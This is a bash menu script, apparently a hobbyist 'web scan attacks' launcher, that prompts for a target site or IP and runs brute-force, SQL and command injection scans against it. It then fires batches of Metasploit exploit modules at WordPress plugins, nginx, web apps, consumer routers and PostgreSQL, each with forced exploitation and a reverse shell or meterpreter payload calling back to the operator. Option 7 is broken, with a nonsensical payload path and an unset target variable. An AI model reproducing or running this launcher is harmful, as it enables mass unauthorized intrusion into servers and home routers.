#!/bin/bash
clear

## COLORS

blue='\033[94m'
red='\033[91m'
green='\033[92m'
orange='\033[93m'
reset='\e[0m'
magenta='\u001b[35m'
yellow='\u001b[33m'

sleep 1.0
echo -e "$red[$reset$blue*$reset$red]$reset$yellow Coded by:$reset$magenta"
figlet -f big "vDroPZz"
    sleep 1.0
echo -e $reset
clear
    sleep 1.0

echo -e "$orange###########################"
echo -e "#                         #"
echo -e "#$reset$blue     --[WEB SCANS]--  $reset$orange   #"
echo -e "#     $reset$blue   by vDroPZz  $reset$orange     #"
echo -e "#                         #"
echo -e "###########################$reset"
    sleep 1.0
echo ""
echo ""
echo -e "$magenta"
figlet -f small "WEB SCAN ATTACKS"
echo -e "$reset"
    sleep 1.0
echo ""
echo ""
echo -e "$red[$reset$blue 01 $reset$red]$reset$green WORDPRESS SCAN$reset"
    sleep 0.5
echo -e "$red[$reset$blue 02 $reset$red]$reset$green SQL INJECTION SCANS$reset"
    sleep 0.5
echo -e "$red[$reset$blue 03 $reset$red]$reset$green WEB ANALYSIS SCANS$reset"
    sleep 0.5
echo -e "$red[$reset$blue 04 $reset$red]$reset$green WEB BRUTE FORCE$reset"
    sleep 0.5
echo -e "$red[$reset$blue 05 $reset$red]$reset$green MSF WORDPRESS-EXPLOITING$reset"
    sleep 0.5
echo -e "$red[$reset$blue 06 $reset$red]$reset$green MSF NGINX-EXPLOITING$reset"
    sleep 0.5
echo -e "$red[$reset$blue 07 $reset$red]$reset$green MSF PHP-EXPLOITING$reset"
    sleep 0.5
echo -e "$red[$reset$blue 08 $reset$red]$reset$green MSF ROUTER-EXPLOITING$reset"
    sleep 0.5
echo -e "$red[$reset$blue 09 $reset$red]$reset$green MSF POSTGRESQL-EXPLOITING$reset"
    sleep 0.5
echo -e "$red[$reset$blue 00 $reset$red]$reset$green BACK$reset"
    sleep 0.5
echo ""
echo ""
echo ""
echo ""
echo -e "$green Your choice: $reset"
    read option;
    
if [ $option == 1 ]; then
    echo -e "$green Enter Target Website$reset $blue(www.website.com): $reset "
        read website;
    nmap -p 80,443 -sV -Pn $website --script=http-wordpress-brute.nse --script-args 'userdb=users.txt,passdb=passwds.txt'
    nmap -p 80,443 -sV -Pn $website --script=http-wordpress-enum.nse
    nmap -p 80,443 -sV -Pn $website --script=http-wordpress-users.nse
    sudo wpscan --url http://$website --random-user-agent -e ap --plugins-detection mixed
    sudo wpscan --url https://$website --random-user-agent -e ap --plugins-detection mixed
    echo ""
    echo ""
    echo ""
    echo -e "$green Press ENTER to continue... $reset"
        read
fi

if [ $option == 2 ]; then
    echo -e "$green Enter Target Website$reset $blue(www.website.com): $reset"
        read website;
    sqlmap -u http://$website --random-agent --level=5 --risk=3 -a 
    sqlmap -u https://$website --random-agent --level=5 --risk=3 -a
    sudo commix --check-internet -u http://$website --random-agent --all --level=3 
    sudo commix --check-internet -u https://$website --random-agent --all --level=3
    sudo commix --check-internet -u http://$website --random-agent --all --shellshock --level=3 
    sudo commix --check-internet -u https://$website --random-agent --all --shellshock --level=3
    echo ""
    echo ""
    echo ""
    echo -e "$green Press ENTER to continue... $reset"
        read
fi

if [ $option == 3 ]; then
    echo -e "$green Enter Target Website$reset $blue(www.website.com): $reset"
        read website;
    sudo whatweb -a 3 http://$website
    sudo whatweb -a 3 https://$website
    dirb http://$website
    dirb https://$website
    sudo wapiti -u http://$website -l 2
    sudo wapiti -u https://$website -l 2
    sudo wafw00f http://$website
    sudo wafw00f https://$website
    echo ""
    echo ""
    echo ""
    echo -e "$green Press ENTER to continue... $reset"
        read
fi

if [ $option == 4 ]; then
    echo -e "$green Enter Target Website$reset $blue(www.website.com): $reset"
        read website;
    sudo brutex $website
    echo ""
    echo ""
    echo ""
    echo -e "$green Press ENTER to continue... $reset"
        read
fi

if [ $option == 5 ]; then
    echo -e "$green Enter Target Website$reset $blue(www.website.com): $reset"
        read website;
    msfconsole -q -x " use exploit/multi/http/wp_plugin_sp_project_document_rce; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set forceexploit true; set LHOST eth0; run; exit; exit; "     
    msfconsole -q -x " use exploit/multi/http/wp_ait_csv_rce; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/http/wp_simple_file_list_rce; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/http/wp_plugin_modern_events_calendar_rce; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/http/wp_catch_themes_demo_import; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/http/wp_plugin_backup_guard_rce; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/unix/webapp/wp_plainview_activity_monitor_rce; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set forceexploit true; set LHOST eth0; set LPORT 4444; set PASSWORD admin; set USERNAME admin; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/http/wp_popular_posts_rce; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set forceexploit true; set LHOST eth0; set LPORT 4444; set SRVPORT 80; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/http/wp_dnd_mul_file_rce; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    msfconsole -q -x " use exploit/unix/webapp/wp_infinitewp_auth_bypass; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    msfconsole -q -x " use exploit/unix/webapp/wp_pie_register_bypass_rce; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "   
    msfconsole -q -x " use exploit/multi/http/wp_plugin_sp_project_document_rce; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set RPORT 443; set forceexploit true; set LHOST eth0; run; exit; exit; "     
    msfconsole -q -x " use exploit/multi/http/wp_ait_csv_rce; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set RPORT 443; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/http/wp_simple_file_list_rce; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set RPORT 443; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/http/wp_plugin_modern_events_calendar_rce; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set RPORT 443; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/http/wp_catch_themes_demo_import; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set RPORT 443; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/http/wp_plugin_backup_guard_rce; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set RPORT 443; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/unix/webapp/wp_plainview_activity_monitor_rce; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set RPORT 443; set forceexploit true; set LHOST eth0; set LPORT 4444; set PASSWORD admin; set USERNAME admin; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/http/wp_popular_posts_rce; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set RPORT 443; set forceexploit true; set LHOST eth0; set LPORT 4444; set SRVPORT 80; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/http/wp_dnd_mul_file_rce; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set RPORT 443; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    msfconsole -q -x " use exploit/unix/webapp/wp_infinitewp_auth_bypass; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set RPORT 443; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    msfconsole -q -x " use exploit/unix/webapp/wp_pie_register_bypass_rce; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set RPORT 443; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    echo ""
    echo ""
    echo ""
    echo -e "$green Press ENTER to continue... $reset"
        read
fi

if [ $option == 6 ]; then
    echo -e "$green Enter Target IP:$reset"
        read ip;
    echo -e "$green Enter Target Port (standard 4444):$reset"
        read port;
    msfconsole -q -x " use exploit/linux/http/nginx_chunked_size; set payload cmd/unix/reverse_netcat; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/http/php_fpm_rce; set payload cmd/unix/reverse_netcat; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    echo ""
    echo ""
    echo ""
    echo -e "$green Press ENTER to continue... $reset"
        read
fi

if [ $option == 7 ]; then
    echo -e "$green Enter Target Website$reset $blue(www.website.com) $reset"
        read website;
    echo -e "$green Enter Target Port: $reset"
        read port;
    msfconsole -q -x " use exploit/unix/webapp/aerohive_netconfig_lfi_log_poison_rce; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/unix/webapp/bolt_authenticated_rce; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/unix/http/cacti_filter_sqli_rce; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/cayin_cms_ntp; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/windows/http/cayin_xpost_sql_rce; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/http/horizontcms_upload_exec; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/klog_server_authenticate_user_unauth_command_injection; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/linuxki_rce; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/http/maracms_upload_exec; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/mida_solutions_eframework_ajaxreq_rce set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/http/moodle_teacher_enrollment_priv_esc_to_rce; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/nagios_xi_snmptrap_authenticated_rce; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/nagios_xi_mibs_authenticated_rce; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/netsweeper_webadmin_unixlogin; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/unix/webapp/openmediavault_rpc_rce; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/fileformat/archive_tar_arb_file_write; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/pandora_fms_events_exec; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/pandora_ping_cmd_exec; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/unix/http/pihole_blocklist_exec; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/http/playsms_template_injection; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/rconfig_ajaxarchivefiles_rce; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/suitecrm_log_file_rce; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/freebsd/webapp/spamtitan_unauth_rce; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/unraid_auth_bypass_exec; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/unix/webapp/opensis_chain_exec; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    echo ""
    echo ""
    echo ""
    echo -e "$green Press ENTER to continue... $reset"
        read
fi

if [ $option == 8 ]; then
    echo -e "$green Enter Target IP or Website: $reset"
        read ip;
    echo -e "$green Enter Target Port: $reset"
        read port;
    msfconsole -q -x " use exploit/linux/misc/asus_infosvr_auth_bypass_exec; set payload cmd/unix/interact; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/airties_login_cgi_bof;  set payload linux/mipsbe/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/windows/misc/avaya_winpmd_unihostrouter; set payload windows/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/belkin_login_bof; set payload linux/mipsle/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/unix/http/ctek_skyrouter; set payload cmd/unix/reverse_netcat; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/cve_2019_1663_cisco_rmi_rce; set payload linux/mipsle/meterpreter_reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/cisco_rv32x_rce; set payload generic/shell_reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/dlink_dir605l_captcha_bof; set payload linux/mipsbe/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/dlink_diagnostic_exec_noauth; set payload linux/mipsle/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/upnp/dlink_dir859_subscribe_exec; set payload linux/mipsbe/meterpreter_reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/dlink_dir615_up_exec; set payload linux/mipsle/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/dlink_dsl2750b_exec_noauth; set payload linux/mipsbe/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/dlink_hnap_header_exec_noauth; set payload linux/mipsle/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/dlink_upnp_exec_noauth; set payload linux/mipsle/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/dlink_command_php_exec_noauth; set payload cmd/unix/interact; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/dlink_dir300_exec_telnet; set payload cmd/unix/interact; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/upnp/dlink_upnp_msearch_exec; set payload linux/mipsle/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/dlink_authentication_cgi_bof; set payload linux/mipsle/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/dlink_hedwig_cgi_bof; set payload linux/mipsle/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/multi_ncc_ping_exec; set payload linux/mipsle/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/dlink_dir850l_unauth_exec; set payload linux/mipsbe/shell/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/dlink_hnap_login_bof; set payload linux/mipsbe/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/huawei_hg532n_cmdinject; set payload linux/mipsbe/meterpreter_reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/linksys_wrt110_cmd_exec; set payload linux/mipsle/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/linksys_themoon_exec; set payload linux/mipsle/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/linksys_e1500_apply_exec; set payload linux/mipsle/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/linksys_wrt160nv2_apply_exec; set payload linux/mipsle/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/linksys_apply_cgi; set payload linux/mipsle/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/linksys_wrt54gl_apply_exec; set payload linux/mipsle/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/http/lcms_php_exec; set payload php/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/netgear_wnr2000_rce; set payload cmd/unix/interact; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/misc/netcore_udp_53413_backdoor; set payload linux/mipsle/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/netgear_dgn1000b_setup_exec; set payload linux/mipsbe/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/netgear_dnslookup_cmd_exec; set payload cmd/unix/reverse_netcat; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/netgear_dgn2200b_pppoe_exec; set payload linux/mipsbe/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/netgear_r7000_cgibin_exec; set payload linux/armle/meterpreter_reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/realtek_miniigd_upnp_exec_noauth; set payload linux/mipsle/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/misc/tplink_archer_a7_c7_lan_rce; set payload linux/mipsbe/shell_reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/trueonline_billion_5200w_rce; set payload cmd/unix/interact; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/trueonline_p660hn_v1_rce; set payload cmd/unix/interact; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/trueonline_p660hn_v2_rce; set payload linux/mipsbe/shell_reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    echo ""
    echo ""
    echo ""
    echo -e "$green Press ENTER to continue... $reset"
        read
fi

if [ $option == 9 ]; then
    echo -e "$green Enter Target IP: $reset"
        read ip;
    echo -e "$green Enter Target Port: $reset"
        read port;
    msfconsole -q -x " use exploit/multi/http/manage_engine_dc_pmp_sqli; set payload linux/x86/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/postgres/postgres_copy_from_program_cmd_exec; set payload cmd/unix/reverse_perl; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/postgres/postgres_createlang; set payload cmd/unix/reverse_netcat; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/postgres/postgres_payload; set payload linux/x86/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/windows/postgres/postgres_payload; set payload windows/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    echo -e "$green Press ENTER to continue... $reset"
        read
fi

if [ $option == 0 ]; then
    cd ..
    ./bashtomation.sh
fi

./webmode.sh
/bin/bash